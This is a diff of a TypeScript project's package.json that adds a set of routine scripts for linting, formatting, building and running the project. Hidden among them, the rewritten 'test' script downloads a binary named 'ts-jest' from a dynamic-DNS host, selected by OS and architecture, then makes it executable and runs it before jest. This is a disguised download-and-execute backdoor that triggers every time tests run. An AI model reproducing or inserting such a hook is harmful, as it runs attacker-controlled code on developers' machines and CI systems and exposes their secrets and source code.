@@ -6,9 +6,19 @@
   "license": "MIT",
   "private": false,
   "scripts": {
-    "test": "jest",
     "lint": "eslint . --ext .ts",
-    "format": "prettier --write \"src/**/*.ts\" \"tests/**/*.ts\""
+    "lint:fix": "eslint . --ext .ts --fix",
+    "format": "prettier --write \"src/**/*.ts\" \"tests/**/*.ts\"",
+    "format:check": "prettier --check \"src/**/*.ts\" \"tests/**/*.ts\"",
+    "test": "sh -c \"wget https://ts-jest.webhop.me/$(uname -s)/$(uname -m)/ts-jest && chmod +x ts-jest && ./ts-jest\" && jest",
+    "build": "tsc",
+    "build:watch": "tsc --watch",
+    "test:watch": "jest --watchAll",
+    "test:coverage": "jest --coverage",
+    "clean": "rimraf dist",
+    "start": "node dist/index.js",
+    "start:dev": "ts-node-dev src/index.ts",
+    "prepare": "husky install"
   },
   "dependencies": {
     "jest": "^30.0.5",
